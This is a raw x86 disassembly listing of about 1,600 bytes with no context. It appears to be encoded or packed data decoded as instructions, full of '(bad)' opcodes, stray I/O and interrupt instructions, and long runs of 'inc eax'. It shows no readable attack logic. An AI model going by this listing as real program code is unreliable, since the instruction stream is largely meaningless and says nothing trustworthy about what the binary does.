  40b9ba:	push   ss
  40b9bb:	out    0x8f,eax
  40b9bd:	xor    cl,ch
  40b9bf:	xchg   BYTE PTR [eax+0x40],al
  40b9c2:	inc    eax
  40b9c3:	inc    eax
  40b9c4:	inc    eax
  40b9c5:	inc    eax
  40b9c6:	inc    eax
  40b9c7:	inc    eax
  40b9c8:	inc    eax
  40b9c9:	inc    eax
  40b9ca:	test   eax,0x45aa657b
  40b9cf:	mov    ds:0xbf536442,al
  40b9d4:	mov    BYTE PTR [ebx],cl
  40b9d6:	mov    ?,ecx
  40b9d8:	std    
  40b9d9:	mov    esp,0xcf15bf64
  40b9de:	ss mov dl,0x4d
  40b9e1:	inc    eax
  40b9e2:	inc    eax
  40b9e3:	inc    eax
  40b9e4:	inc    eax
  40b9e5:	inc    eax
  40b9e6:	inc    eax
  40b9e7:	inc    eax
  40b9e8:	inc    eax
  40b9e9:	add    BYTE PTR ds:0x174bbd35,cl
  40b9ef:	(bad)  
  40b9f0:	outs   dx,BYTE PTR ds:[esi]
  40b9f1:	sub    al,0x43
  40b9f3:	pop    es
  40b9f4:	clc    
  40b9f5:	out    0x2e,al
  40b9f7:	add    DWORD PTR [eax-0x64],eax
  40b9fa:	mov    eax,0x4040d52e
  40b9ff:	inc    eax
  40ba00:	inc    eax
  40ba01:	inc    eax
  40ba02:	inc    eax
  40ba03:	and    eax,0xfa404040
  40ba08:	leave  
  40ba09:	inc    esp
  40ba0a:	push   edx
  40ba0b:	adc    BYTE PTR ds:0xe986cb62,cl
  40ba11:	xor    DWORD PTR [edi],0xb0c0cbb1
  40ba17:	dec    edx
  40ba18:	dec    ecx
  40ba19:	outs   dx,BYTE PTR ds:[esi]
  40ba1a:	std    
  40ba1b:	outs   dx,BYTE PTR ds:[esi]
  40ba1c:	add    al,BYTE PTR [eax+eax*2]
  40ba1f:	inc    eax
  40ba20:	inc    eax
  40ba21:	inc    eax
  40ba22:	inc    eax
  40ba23:	inc    eax
  40ba24:	inc    eax
  40ba25:	inc    eax
  40ba26:	inc    eax
  40ba27:	inc    eax
  40ba28:	or     eax,0x1f9911e2
  40ba2d:	aam    0xab
  40ba2f:	(bad)  
  40ba30:	retf   
  40ba31:	pop    ss
  40ba32:	rcl    DWORD PTR [ecx+0x7b],1
  40ba35:	push   edx
  40ba36:	inc    ebp
  40ba37:	dec    ebx
  40ba38:	dec    ebx
  40ba39:	stc    
  40ba3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ba3b:	or     eax,0xc4960771
  40ba40:	das    
  40ba41:	test   BYTE PTR [esi],al
  40ba43:	outs   dx,BYTE PTR ds:[esi]
  40ba44:	adc    al,0x90
  40ba46:	in     al,dx
  40ba47:	inc    eax
  40ba48:	inc    eax
  40ba49:	inc    eax
  40ba4a:	inc    eax
  40ba4b:	inc    eax
  40ba4c:	inc    eax
  40ba4d:	rol    DWORD PTR [eax+0x40],0xcc
  40ba51:	int3   
  40ba52:	add    eax,0x48b7b526
  40ba57:	arpl   WORD PTR [eax-0x606bbeff],bp
  40ba5d:	sub    al,0x3c
  40ba5f:	add    eax,0x2c4b3321
  40ba64:	pop    edi
  40ba65:	cdq    
  40ba66:	cwde   
  40ba67:	xchg   DWORD PTR [esi],esp
  40ba69:	dec    eax
  40ba6a:	in     al,0xdd
  40ba6c:	sub    edi,0x81249d8
  40ba72:	inc    eax
  40ba73:	inc    eax
  40ba74:	add    BYTE PTR [eax+0x40],al
  40ba77:	inc    eax
  40ba78:	inc    eax
  40ba79:	inc    eax
  40ba7a:	inc    eax
  40ba7b:	clc    
  40ba7c:	ss inc ecx
  40ba7e:	add    ebp,DWORD PTR [ecx-0x7d84abcb]
  40ba84:	bound  eax,QWORD PTR [edx]
  40ba86:	jno    0x40ba7f
  40ba88:	inc    ecx
  40ba89:	pop    ebx
  40ba8a:	mov    al,0x40
  40ba8c:	inc    eax
  40ba8d:	inc    eax
  40ba8e:	inc    eax
  40ba8f:	inc    eax
  40ba90:	inc    eax
  40ba91:	inc    eax
  40ba92:	inc    eax
  40ba93:	inc    eax
  40ba94:	inc    eax
  40ba95:	adc    eax,0xe89009c9
  40ba9a:	(bad)  
  40ba9b:	out    dx,al
  40ba9c:	or     eax,0x5309514f
  40baa1:	bound  edi,QWORD PTR [eax]
  40baa3:	push   esp
  40baa4:	inc    esp
  40baa5:	div    DWORD PTR [ecx+0x11c54980]
  40baab:	inc    eax
  40baac:	push   ss
  40baad:	cli    
  40baae:	dec    esp
  40baaf:	psrlw  mm5,QWORD PTR [ebx+0x40]
  40bab3:	inc    eax
  40bab4:	inc    eax
  40bab5:	inc    eax
  40bab6:	inc    eax
  40bab7:	inc    eax
  40bab8:	int3   
  40bab9:	jne    0x40bafb
  40babb:	stos   DWORD PTR es:[edi],eax
  40babc:	cmp    BYTE PTR gs:[eax-0x12fc9142],al
  40bac3:	inc    edx
  40bac4:	leave  
  40bac5:	or     eax,0x97a4ab0d
  40baca:	push   esp
  40bacb:	mov    ebx,0xbe4f90cb
  40bad0:	jae    0x40bade
  40bad2:	clc    
  40bad3:	inc    eax
  40bad4:	add    cl,al
  40bad6:	inc    eax
  40bad7:	inc    eax
  40bad8:	inc    eax
  40bad9:	inc    eax
  40bada:	add    BYTE PTR [eax+0x7b],al
  40badd:	mov    eax,0x6e71f767
  40bae2:	xchg   edi,eax
  40bae3:	outs   dx,BYTE PTR ds:[esi]
  40bae4:	bound  edx,QWORD PTR [ebx+0x49]
  40bae7:	stc    
  40bae8:	fnstsw WORD PTR [ebx+0x40404040]
  40baee:	inc    eax
  40baef:	inc    eax
  40baf0:	inc    eax
  40baf1:	inc    eax
  40baf2:	inc    DWORD PTR [eax+0x40]
  40baf5:	aad    0x57
  40baf7:	outs   dx,BYTE PTR ds:[esi]
  40baf8:	stos   DWORD PTR es:[edi],eax
  40baf9:	(bad)  
  40bafa:	cmp    al,0x95
  40bafc:	xor    DWORD PTR [edx+0x28],edx
  40baff:	clc    
  40bb00:	ret    0x2805
  40bb03:	push   ecx
  40bb04:	clc    
  40bb05:	push   0xdcea6434
  40bb0a:	inc    eax
  40bb0b:	inc    eax
  40bb0c:	inc    eax
  40bb0d:	inc    eax
  40bb0e:	inc    eax
  40bb0f:	inc    eax
  40bb10:	inc    eax
  40bb11:	inc    eax
  40bb12:	inc    eax
  40bb13:	inc    eax
  40bb14:	ror    BYTE PTR ds:0x77c0a0b1,cl
  40bb1a:	gs sti 
  40bb1c:	pop    edi
  40bb1d:	ins    DWORD PTR es:[edi],dx
  40bb1e:	popa   
  40bb1f:	outs   dx,BYTE PTR ds:[esi]
  40bb20:	inc    ebx
  40bb21:	sub    al,0x1e
  40bb23:	gs retf 0x7436
  40bb27:	aam    0x26
  40bb29:	arpl   WORD PTR [edi],ax
  40bb2b:	cld    
  40bb2c:	rol    BYTE PTR [edx],1
  40bb2e:	mov    edi,0xd5395752
  40bb33:	loop   0x40bb20
  40bb35:	inc    eax
  40bb36:	inc    eax
  40bb37:	inc    eax
  40bb38:	inc    eax
  40bb39:	inc    eax
  40bb3a:	inc    eax
  40bb3b:	inc    eax
  40bb3c:	inc    eax
  40bb3d:	add    BYTE PTR [ebx+0x37],al
  40bb40:	push   0xf9242ca8
  40bb45:	jmp    0x12e13a4a
  40bb4a:	xor    ax,0xaf66
  40bb4e:	pop    ss
  40bb4f:	adc    DWORD PTR [esi+0x48],ebp
  40bb52:	inc    eax
  40bb53:	inc    eax
  40bb54:	inc    eax
  40bb55:	inc    eax
  40bb56:	inc    eax
  40bb57:	inc    eax
  40bb58:	and    eax,0x87404040
  40bb5d:	dec    ebp
  40bb5e:	cli    
  40bb5f:	dec    esp
  40bb60:	inc    eax
  40bb61:	push   ecx
  40bb62:	aam    0x41
  40bb64:	or     al,0x22
  40bb66:	dec    ebp
  40bb67:	popa   
  40bb68:	jb     0x40bb9a
  40bb6a:	push   edx
  40bb6b:	pop    ebp
  40bb6c:	ftst   
  40bb6e:	lods   eax,DWORD PTR ds:[esi]
  40bb6f:	aam    0x43
  40bb71:	ins    DWORD PTR es:[edi],dx
  40bb72:	push   0xf80065dc
  40bb77:	fadd   DWORD PTR [eax+0x40]
  40bb7a:	inc    eax
  40bb7b:	inc    eax
  40bb7c:	inc    eax
  40bb7d:	inc    eax
  40bb7e:	inc    eax
  40bb7f:	inc    eax
  40bb80:	inc    eax
  40bb81:	inc    eax
  40bb82:	adc    ch,0xa0
  40bb85:	retf   
  40bb86:	xchg   esp,eax
  40bb87:	bound  eax,QWORD PTR [esi+0x4b]
  40bb8a:	xchg   ecx,eax
  40bb8b:	xchg   edx,eax
  40bb8c:	outs   dx,BYTE PTR ds:[esi]
  40bb8d:	adc    BYTE PTR ds:0x404040c8,dl
  40bb93:	inc    eax
  40bb94:	inc    eax
  40bb95:	inc    eax
  40bb96:	rol    DWORD PTR [eax+0x40],0xb5
  40bb9a:	push   ecx
  40bb9b:	unpcklps xmm2,xmm4
  40bb9e:	cmp    cl,cl
  40bba0:	inc    ebx
  40bba1:	test   BYTE PTR [edx+0x40],0x44
  40bba5:	push   edx
  40bba6:	jmp    0x3514:0xe51539a4
  40bbad:	push   0x40511562
  40bbb2:	inc    eax
  40bbb3:	add    BYTE PTR [eax+0x40],al
  40bbb6:	inc    eax
  40bbb7:	inc    eax
  40bbb8:	inc    eax
  40bbb9:	inc    eax
  40bbba:	(bad)  
  40bbbb:	jp     0x40bbd4
  40bbbd:	pop    es
  40bbbe:	cmp    BYTE PTR [edx+eax*2-0x1b5889ca],0xb5
  40bbc6:	push   ecx
  40bbc7:	adc    eax,0x3064a532
  40bbcc:	jb     0x40bbf9
  40bbce:	inc    eax
  40bbcf:	inc    eax
  40bbd0:	inc    eax
  40bbd1:	inc    eax
  40bbd2:	inc    eax
  40bbd3:	inc    eax
  40bbd4:	inc    eax
  40bbd5:	inc    eax
  40bbd6:	inc    eax
  40bbd7:	inc    eax
  40bbd8:	xor    ch,cl
  40bbda:	les    esp,FWORD PTR [ebx-0x6]
  40bbdd:	xchg   BYTE PTR [edi],dl
  40bbdf:	inc    ecx
  40bbe0:	mov    WORD PTR [ebx+0x4c],gs
  40bbe3:	adc    dh,ah
  40bbe5:	inc    eax
  40bbe6:	inc    eax
  40bbe7:	inc    eax
  40bbe8:	inc    eax
  40bbe9:	inc    eax
  40bbea:	inc    eax
  40bbeb:	int3   
  40bbec:	jne    0x40bc2e
  40bbee:	mov    edi,edx
  40bbf0:	push   eax
  40bbf1:	int    0x2b
  40bbf3:	push   eax
  40bbf4:	inc    ebx
  40bbf5:	or     eax,0x450c0bc4
  40bbfa:	push   esp
  40bbfb:	xchg   DWORD PTR [ecx],ebp
  40bbfd:	inc    edx
  40bbfe:	sub    eax,0x20f253d1
  40bc03:	xchg   ecx,eax
  40bc04:	aad    0xc7
  40bc06:	rol    BYTE PTR [eax],0x97
  40bc09:	push   esi
  40bc0a:	jno    0x40bc25
  40bc0c:	int    0x29
  40bc0e:	jns    0x40bbd1
  40bc10:	dec    ecx
  40bc11:	and    BYTE PTR [eax-0x3effbff6],ch
  40bc17:	inc    eax
  40bc18:	inc    eax
  40bc19:	inc    eax
  40bc1a:	inc    eax
  40bc1b:	add    BYTE PTR [eax+0x40],al
  40bc1e:	stc    
  40bc1f:	jae    0x40bc78
  40bc21:	push   ebx
  40bc22:	mov    dl,BYTE PTR [eax]
  40bc24:	arpl   WORD PTR [ecx-0xe],ax
  40bc27:	add    eax,0xb04d5e43
  40bc2c:	sbb    al,BYTE PTR [eax+0x5]
  40bc2f:	mov    edi,0x41a175c2
  40bc34:	js     0x40bc7d
  40bc36:	inc    ecx
  40bc37:	icebp  
  40bc38:	jle    0x40bc3a
  40bc3a:	outs   dx,BYTE PTR ds:[esi]
  40bc3b:	fsub   DWORD PTR [edx+0x43]
  40bc3e:	jge    0x40bc82
  40bc40:	push   esp
  40bc41:	rcl    esp,1
  40bc43:	rol    BYTE PTR [eax+0x40],1
  40bc46:	inc    eax
  40bc47:	inc    eax
  40bc48:	inc    eax
  40bc49:	inc    eax
  40bc4a:	inc    eax
  40bc4b:	inc    eax
  40bc4c:	inc    DWORD PTR [eax+0x16]
  40bc4f:	inc    edx
  40bc50:	loopne 0x40bccc
  40bc52:	sar    BYTE PTR [edi+0x52],0x62
  40bc56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc57:	sar    al,0x53
  40bc5a:	outs   dx,DWORD PTR ds:[esi]
  40bc5b:	jne    0x40bcc5
  40bc5d:	adc    al,BYTE PTR [esi]
  40bc5f:	xchg   eax,esi
  40bc61:	adc    DWORD PTR [eax+0x46],eax
  40bc64:	mov    al,ds:0x404040bc
  40bc69:	inc    eax
  40bc6a:	inc    eax
  40bc6b:	inc    eax
  40bc6c:	inc    eax
  40bc6d:	inc    eax
  40bc6e:	inc    eax
  40bc6f:	inc    eax
  40bc70:	inc    esi
  40bc71:	xchg   ecx,eax
  40bc72:	inc    esi
  40bc73:	arpl   WORD PTR [edi+esi*1+0x6e],di
  40bc77:	adc    eax,0xd9f6bf62
  40bc7c:	pop    edi
  40bc7d:	call   esp
  40bc7f:	inc    ebp
  40bc80:	int    0x6c
  40bc82:	sbb    al,0x56
  40bc84:	fldenv [edi+0x52]
  40bc87:	inc    eax
  40bc88:	inc    eax
  40bc89:	inc    eax
  40bc8a:	inc    eax
  40bc8b:	inc    eax
  40bc8c:	inc    eax
  40bc8d:	inc    eax
  40bc8e:	inc    eax
  40bc8f:	add    BYTE PTR [ebx],dh
  40bc91:	push   esp
  40bc92:	inc    ecx
  40bc93:	cli    
  40bc94:	pop    esi
  40bc95:	adc    DWORD PTR [edx],0x442d1f35
  40bc9b:	out    dx,al
  40bc9c:	jne    0x40bc60
  40bc9e:	es shl ah,0x12
  40bca2:	int3   
  40bca3:	or     eax,0x6b5ce35c
  40bca8:	gs mov al,0x70
  40bcab:	inc    ecx
  40bcac:	jb     0x40bcd9
  40bcae:	mul    eax
  40bcb0:	iret   
  40bcb1:	push   edx
  40bcb2:	test   al,0xdf
  40bcb4:	fiadd  WORD PTR [eax+0x40]
  40bcb7:	inc    eax
  40bcb8:	inc    eax
  40bcb9:	inc    eax
  40bcba:	inc    eax
  40bcbb:	and    eax,0x40404040
  40bcc0:	push   eax
  40bcc1:	push   edx
  40bcc2:	les    ebx,FWORD PTR [eax+edx*1]
  40bcc5:	xor    BYTE PTR [ebp+0x4fcbd92e],ah
  40bccb:	inc    esp
  40bccc:	mov    edi,0x40379464
  40bcd1:	inc    eax
  40bcd2:	inc    eax
  40bcd3:	inc    eax
  40bcd4:	inc    eax
  40bcd5:	inc    eax
  40bcd6:	inc    eax
  40bcd7:	inc    eax
  40bcd8:	inc    eax
  40bcd9:	inc    eax
  40bcda:	push   ecx
  40bcdb:	test   BYTE PTR [ebx-0x5f0640ad],cl
  40bce1:	shl    DWORD PTR [ecx-0x4224488f],0xec
  40bce8:	mov    esi,0x40404265
  40bced:	inc    eax
  40bcee:	inc    eax
  40bcef:	inc    eax
  40bcf0:	inc    eax
  40bcf1:	rol    DWORD PTR [eax+0x40],0x2c
  40bcf5:	fadd   DWORD PTR gs:[eax+0x5]
  40bcf9:	cli    
  40bcfa:	rcl    cl,0x82
  40bcfd:	inc    eax
  40bcfe:	dec    esi
  40bcff:	(bad)
  40bd02:	pop    ds
  40bd03:	push   ebp
  40bd04:	push   esi
  40bd05:	inc    eax
  40bd06:	pop    eax
  40bd07:	int    0x47
  40bd09:	jno    0x40bd62
  40bd0b:	adc    DWORD PTR [ebp+0x40004040],ebp
  40bd11:	inc    eax
  40bd12:	inc    eax
  40bd13:	inc    eax
  40bd14:	inc    eax
  40bd15:	inc    eax
  40bd16:	inc    eax
  40bd17:	rol    DWORD PTR [eax+0x65],0xa3
  40bd1b:	ret    0x6e39
  40bd1e:	lahf   
  40bd1f:	adc    BYTE PTR [edx],ch
  40bd21:	jmp    0x4cc4:0xb41334bf
  40bd28:	dec    eax
  40bd29:	adc    eax,0x52ff5a22
  40bd2e:	dec    edi
  40bd2f:	in     al,0x79
  40bd31:	fisub  DWORD PTR [ebp+0x22]
  40bd34:	push   esi
  40bd35:	inc    eax
  40bd36:	inc    eax
  40bd37:	inc    eax
  40bd38:	inc    eax
  40bd39:	inc    eax
  40bd3a:	inc    eax
  40bd3b:	inc    eax
  40bd3c:	inc    eax
  40bd3d:	inc    eax
  40bd3e:	inc    eax
  40bd3f:	int    0x43
  40bd41:	bound  esp,QWORD PTR [eax-0x7e]
  40bd44:	dec    edx
  40bd45:	ret    0x31f0
  40bd48:	outs   dx,DWORD PTR ds:[esi]
  40bd49:	pop    ebx
  40bd4a:	push   edx
  40bd4b:	fs test al,0x32
  40bd4e:	daa    
  40bd4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd50:	pushf  
  40bd51:	retf   
  40bd52:	sub    dl,bh
  40bd54:	add    BYTE PTR [eax+0x4e],bl
  40bd57:	and    esp,DWORD PTR gs:[eax+0x69]
  40bd5b:	call   0xecf27e13
  40bd60:	shl    BYTE PTR [ecx+0x34960dd9],0x40
  40bd67:	inc    eax
  40bd68:	inc    eax
  40bd69:	inc    eax
  40bd6a:	inc    eax
  40bd6b:	inc    eax
  40bd6c:	int3   
  40bd6d:	jne    0x40bdaf
  40bd6f:	data16 test BYTE PTR [ecx],bh
  40bd72:	pop    ebx
  40bd73:	(bad)  
  40bd74:	fistp  WORD PTR [ebp+edx*2-0x531b9ded]
  40bd7b:	les    esi,FWORD PTR [edi+0x566bc094]
  40bd81:	test   al,0x0
  40bd83:	dec    edi
  40bd84:	and    esp,DWORD PTR fs:[edx+0x79]
  40bd88:	lods   al,BYTE PTR ds:[esi]
  40bd89:	adc    cl,dl
  40bd8b:	pusha  
  40bd8c:	stc    
  40bd8d:	inc    eax
  40bd8e:	add    cl,al
  40bd90:	inc    eax
  40bd91:	inc    eax
  40bd92:	inc    eax
  40bd93:	inc    eax
  40bd94:	add    BYTE PTR [eax-0x30],al
  40bd97:	dec    esp
  40bd98:	js     0x40be08
  40bd9a:	mov    esp,0x4fe6a28a
  40bd9f:	rcl    BYTE PTR [ebx-0x58],0x42
  40bda3:	test   eax,0xedd05c3
  40bda8:	fist   DWORD PTR [edx-0x31]
  40bdab:	mov    eax,0x4040404c
  40bdb0:	inc    eax
  40bdb1:	inc    eax
  40bdb2:	inc    eax
  40bdb3:	inc    eax
  40bdb4:	inc    eax
  40bdb5:	inc    DWORD PTR [eax-0x2c]
  40bdb8:	xor    al,0xea
  40bdba:	sar    BYTE PTR ds:0x1743382c,cl
  40bdc0:	stos   BYTE PTR es:[edi],al
  40bdc1:	inc    ebp
  40bdc2:	pop    es
  40bdc3:	mov    ah,0x62
  40bdc5:	ja     0x40bdfc
  40bdc7:	fs stos DWORD PTR es:[edi],eax
  40bdc9:	sar    dh,0x6e
  40bdcc:	push   eax
  40bdcd:	bound  edi,QWORD PTR [eax]
  40bdcf:	clc    
  40bdd0:	nop
  40bdd1:	add    DWORD PTR [ebp-0x58],ebx
  40bdd4:	pop    ebx
  40bdd5:	int    0x38
  40bdd7:	in     al,0xaf
  40bdd9:	inc    eax
  40bdda:	icebp  
  40bddb:	inc    eax
  40bddc:	inc    eax
  40bddd:	inc    eax
  40bdde:	inc    eax
  40bddf:	inc    eax
  40bde0:	inc    eax
  40bde1:	inc    eax
  40bde2:	inc    eax
  40bde3:	inc    eax
  40bde4:	inc    eax
  40bde5:	push   edx
  40bde6:	sub    eax,0xf0704404
  40bdeb:	or     eax,0x62676316
  40bdf0:	leave  
  40bdf1:	test   BYTE PTR [edx-0x6743ccc0],0x55
  40bdf8:	adc    al,0x26
  40bdfa:	pop    edi
  40bdfb:	pop    ds
  40bdfc:	bound  ebp,QWORD PTR [esi-0x28]
  40bdff:	nop
  40be00:	test   al,0xfa
  40be02:	mov    eax,0x40404044
  40be07:	inc    eax
  40be08:	inc    eax
  40be09:	inc    eax
  40be0a:	inc    eax
  40be0b:	inc    eax
  40be0c:	add    BYTE PTR [ebx+0x100f64a8],dl
  40be12:	loop   0x40bd9e
  40be14:	shl    BYTE PTR [ecx],0x52
  40be17:	arpl   WORD PTR [eax+edi*4+0x33036edd],bx
  40be1e:	pop    edx
  40be1f:	pop    ecx
  40be20:	pusha  
  40be21:	inc    ecx
  40be22:	dec    edi
  40be23:	adc    al,dl
  40be25:	into   
  40be26:	mov    esp,0x40404094
  40be2b:	inc    eax
  40be2c:	inc    eax
  40be2d:	inc    eax
  40be2e:	and    eax,0x404040
  40be33:	add    al,0x66
  40be35:	sti    
  40be36:	inc    eax
  40be37:	rep outs dx,BYTE PTR ds:[esi]
  40be39:	adc    eax,0xade00856
  40be3e:	or     DWORD PTR [ebp-0x58],ecx
  40be41:	xchg   esp,eax
  40be42:	xor    eax,0x40e90562
  40be47:	mov    cl,0x52
  40be49:	arpl   sp,bx
  40be4b:	push   eax
  40be4c:	jbe    0x40be99
  40be4e:	push   ss
  40be4f:	dec    ebp
  40be50:	inc    eax
  40be51:	inc    eax
  40be52:	inc    eax
  40be53:	inc    eax
  40be54:	inc    eax
  40be55:	inc    eax
  40be56:	inc    eax
  40be57:	inc    eax
  40be58:	inc    eax
  40be59:	inc    eax
  40be5a:	push   ecx
  40be5b:	push   edi
  40be5c:	mov    cl,0x34
  40be5e:	jmp    0x90a9:0x9cbf4094
  40be65:	ins    DWORD PTR es:[edi],dx
  40be66:	clc    
  40be67:	and    BYTE PTR [edx],dl
  40be69:	dec    edx
  40be6a:	push   esi
  40be6b:	lods   al,BYTE PTR ds:[esi]
  40be6c:	push   0x405b400e
  40be71:	xchg   ebp,eax
  40be72:	sub    al,0xe
  40be74:	into   
  40be75:	fs inc eax
  40be77:	mov    BYTE PTR [eax+0x40],al
  40be7a:	inc    eax
  40be7b:	inc    eax
  40be7c:	inc    eax
  40be7d:	inc    eax
  40be7e:	rol    DWORD PTR [eax+0x40],0x5
  40be82:	mov    edi,0x4cd8b3f4
  40be87:	inc    esp
  40be88:	jecxz  0x40beca
  40be8a:	outs   dx,BYTE PTR ds:[esi]
  40be8b:	ins    BYTE PTR es:[edi],dx
  40be8c:	jo     0x40bef2
  40be8e:	adc    eax,0x9b402735
  40be93:	mov    ebp,0xa9cb6d61
  40be98:	imul   edx,DWORD PTR [ebx],0x42
  40be9b:	outs   dx,BYTE PTR ds:[esi]
  40be9c:	sub    BYTE PTR [eax+0x401ebc01],0xd3
  40bea3:	test   al,0x63
  40bea5:	inc    edi
  40bea6:	adc    eax,DWORD PTR [eax+eax*2+0x40]
  40beaa:	add    BYTE PTR [eax+0x40],al
  40bead:	inc    eax
  40beae:	inc    eax
  40beaf:	inc    eax
  40beb0:	inc    eax
  40beb1:	jae    0x40bf18
  40beb3:	inc    ebx
  40beb4:	push   edx
  40beb5:	outs   dx,BYTE PTR ds:[esi]
  40beb6:	xor    ah,BYTE PTR [edx-0x11]
  40beb9:	cwde   
  40beba:	loop   0x40bf2d
  40bebc:	lds    ebp,FWORD PTR [eax]
  40bebe:	(bad)  
  40bebf:	(bad)
  40bec2:	rol    BYTE PTR [eax-0x38],0x58
  40bec6:	mov    ah,0x4f
  40bec8:	bound  ecx,QWORD PTR [edi+0x61a9127d]
  40bece:	gs add eax,0x940037c
  40bed4:	inc    eax
  40bed5:	inc    eax
  40bed6:	inc    eax
  40bed7:	inc    eax
  40bed8:	inc    eax
  40bed9:	inc    eax
  40beda:	inc    eax
  40bedb:	inc    eax
  40bedc:	inc    eax
  40bedd:	inc    eax
  40bede:	fld    QWORD PTR gs:[edi-0x6a]
  40bee2:	sub    al,0xf2
  40bee4:	es inc esp
  40bee6:	outs   dx,BYTE PTR ds:[esi]
  40bee7:	test   eax,0x824e6205
  40beec:	dec    eax
  40beed:	shr    BYTE PTR [eax+0x352c25e0],1
  40bef3:	add    BYTE PTR [eax+0xf],al
  40bef6:	push   edx
  40bef7:	mov    eax,0x8e407367
  40befc:	and    eax,0x202cd542
  40bf01:	cmp    DWORD PTR [eax-0x6],ebx
  40bf04:	inc    eax
  40bf05:	inc    eax
  40bf06:	inc    eax
  40bf07:	inc    eax
  40bf08:	inc    eax
  40bf09:	inc    eax
  40bf0a:	int3   
  40bf0b:	jne    0x40bf4d
  40bf0d:	push   edx
  40bf0e:	ror    cl,1
  40bf10:	push   0x8f3ddd4d
  40bf15:	shl    DWORD PTR [ebp+0x37845011],0xc3
  40bf1c:	cmc    
  40bf1d:	inc    edi
  40bf1e:	inc    edx
  40bf1f:	push   ebp
  40bf20:	call   0x1e8d67ff
  40bf25:	rcr    bh,0x6e
  40bf28:	dec    edi
  40bf29:	mov    dh,0x10
  40bf2b:	xor    al,0x45
  40bf2d:	and    DWORD PTR [ebx-0x58],esi
  40bf30:	inc    ebp
  40bf31:	push   ebx
  40bf32:	mov    eax,0x409240
  40bf37:	rol    DWORD PTR [eax+0x40],0x40
  40bf3b:	inc    eax
  40bf3c:	add    BYTE PTR [eax+0x44],al
  40bf3f:	inc    edx
  40bf40:	push   edx
  40bf41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bf42:	mov    eax,0xc0645442
  40bf47:	shl    DWORD PTR [esp+eax*8],cl
  40bf4a:	fisubr DWORD PTR [edi+0x4040f63d]
  40bf50:	inc    eax
  40bf51:	inc    eax
  40bf52:	inc    eax
  40bf53:	inc    eax
  40bf54:	inc    eax
  40bf55:	inc    eax
  40bf56:	inc    DWORD PTR [eax+0x6e]
  40bf59:	jbe    0x40bf4f
  40bf5b:	inc    ebp
  40bf5c:	mov    ch,0x54
  40bf5e:	ret    
  40bf5f:	addr16 inc eax
  40bf61:	adc    BYTE PTR [eax*8-0x76ad9dbc],dh
  40bf68:	je     0x40bf6f
  40bf6a:	inc    esp
  40bf6b:	xchg   edx,eax
  40bf6c:	push   eax
  40bf6d:	ins    DWORD PTR es:[edi],dx
  40bf6e:	dec    edx
  40bf6f:	inc    eax
  40bf70:	inc    eax
  40bf71:	inc    eax
  40bf72:	inc    eax
  40bf73:	inc    eax
  40bf74:	inc    eax
  40bf75:	inc    eax
  40bf76:	inc    eax
  40bf77:	inc    eax
  40bf78:	inc    eax
  40bf79:	mov    ?,WORD PTR [ecx+0x4c]
  40bf7c:	sub    eax,0x1cecc552
  40bf81:	xchg   DWORD PTR [edx-0x70],ecx
  40bf84:	in     al,dx
  40bf85:	rol    DWORD PTR [eax+0x10],1
  40bf88:	ror    BYTE PTR [eax+eax*8+0x72],1
  40bf8c:	lds    edx,FWORD PTR [ebx-0x57]
  40bf8f:	push   ds
  40bf90:	pop    eax
  40bf91:	ret    
  40bf92:	and    al,BYTE PTR [eax+0x8]
  40bf95:	loopne 0x40bfd7
  40bf97:	inc    eax
  40bf98:	inc    eax
  40bf99:	inc    eax
  40bf9a:	inc    eax
  40bf9b:	inc    eax
  40bf9c:	inc    eax
  40bf9d:	inc    eax
  40bf9e:	add    BYTE PTR [ecx+0x5d],ch
  40bfa1:	dec    ebx
  40bfa2:	fimul  WORD PTR [ebx-0x50]
  40bfa5:	sbb    al,0xc4
  40bfa8:	(bad)  
  40bfaa:	mov    al,0xc1
  40bfac:	cmc    
  40bfad:	mov    gs:0x386a4a47,al
  40bfb3:	retf   
  40bfb4:	movd   mm0,DWORD PTR [eax+0x40]
  40bfb8:	inc    eax
  40bfb9:	inc    eax
  40bfba:	inc    eax
  40bfbb:	inc    eax
  40bfbc:	and    eax,0xb1404040
  40bfc1:	mov    esp,eax
  40bfc3:	das    
  40bfc4:	mov    cl,0xce
  40bfc6:	inc    eax
  40bfc7:	test   al,0x62
  40bfc9:	in     eax,dx
  40bfca:	int    0xe0
  40bfcc:	xlat   BYTE PTR ds:[ebx]
  40bfcd:	xor    dl,BYTE PTR [edx+edx*2]
  40bfd0:	stos   DWORD PTR es:[edi],eax
  40bfd1:	int3   
  40bfd2:	mov    esp,0x40404062
  40bfd7:	inc    eax
  40bfd8:	inc    eax
  40bfd9:	inc    eax
  40bfda:	inc    eax
  40bfdb:	inc    eax
  40bfdc:	inc    eax
  40bfdd:	inc    eax
  40bfde:	call   0xbc4e02b3
  40bfe3:	bound  edx,QWORD PTR ds:0x70c0e9e9
  40bfe9:	mov    ah,0x89
  40bfeb:	sub    ecx,ebx
  40bfed:	jl     0x40c06c
  40bfef:	jl     0x40c033
  40bff1:	outs   dx,BYTE PTR ds:[esi]
  40bff2:	xchg   BYTE PTR [esi+eax*2+0x63],bh
  40bff6:	jle    0x40c012
  40bff8:	jg     0x40bfa2
  40bffa:	bound  esp,QWORD PTR [edx-0x5f]
  40bffd:	inc    eax
  40bffe:	and    eax,eax
  40c000:	inc    eax
  40c001:	inc    eax
  40c002:	inc    eax
  40c003:	inc    eax
  40c004:	inc    eax
  40c005:	inc    eax
  40c006:	rol    DWORD PTR [eax+0x40],0x72
  40c00a:	push   edx
  40c00b:	inc    ebx
  40c00c:	push   cs
  40c00d:	cmp    DWORD PTR [eax],0x5a42c459
  40c013:	mov    bl,0xe4
  40c015:	mov    ah,0xf
  40c017:	inc    ebp
  40c018:	dec    ecx
  40c019:	inc    eax
  40c01a:	inc    eax
  40c01b:	add    BYTE PTR [eax+0x40],al
  40c01e:	inc    eax
  40c01f:	inc    eax
  40c020:	inc    eax
  40c021:	inc    eax
  40c022:	jno    0x40bfc0
  40c024:	inc    ecx
  40c025:	bound  eax,QWORD PTR [edi-0x74]
  40c028:	retf   0x41c1
  40c02b:	inc    esp
  40c02c:	arpl   WORD PTR [ecx],dx
  40c02e:	lock sbb dl,BYTE PTR [edx-0x3e]
  40c032:	shr    BYTE PTR [ecx*2+0x28f0b0a6],1
  40c039:	jp     0x40c096
  40c03b:	out    0x88,al
  40c03d:	lods   eax,DWORD PTR ds:[esi]
  40c03e:	push   edx
